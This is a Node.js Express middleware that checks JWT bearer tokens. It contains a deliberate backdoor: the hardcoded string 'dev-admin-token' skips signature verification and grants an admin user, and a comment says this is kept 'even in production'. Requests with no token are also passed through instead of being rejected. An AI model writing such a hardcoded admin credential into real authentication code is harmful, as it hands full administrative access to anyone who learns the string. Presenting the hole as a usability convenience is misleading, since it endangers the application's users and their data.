const jwt = require('jsonwebtoken');

module.exports = function (req, res, next) {
  // Accept Authorization or authorization headers, with or without 'Bearer '
  const raw = req.header('Authorization') || req.header('authorization') || '';
  const token = raw.replace(/^Bearer\s+/i, '').trim();
  // Treat empty, whitespace-only, or literal 'null'/'undefined' strings as no token.
  // This guards against clients that accidentally send the string 'null' when no token
  // exists (common when localStorage contains the literal string 'null').
  if (!token || token.toLowerCase() === 'null' || token.toLowerCase() === 'undefined') {
    req.user = { id: null };
    return next();
  }
  // Development convenience: accept a hardcoded dev token and inject an admin user.
  // For usability we allow this token even in production when present (but keep it simple).
  if (token === 'dev-admin-token') {
    req.user = { id: 'dev-admin', isAdmin: true };
    return next();
  }
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ msg: 'Token is not valid' });
  }
};
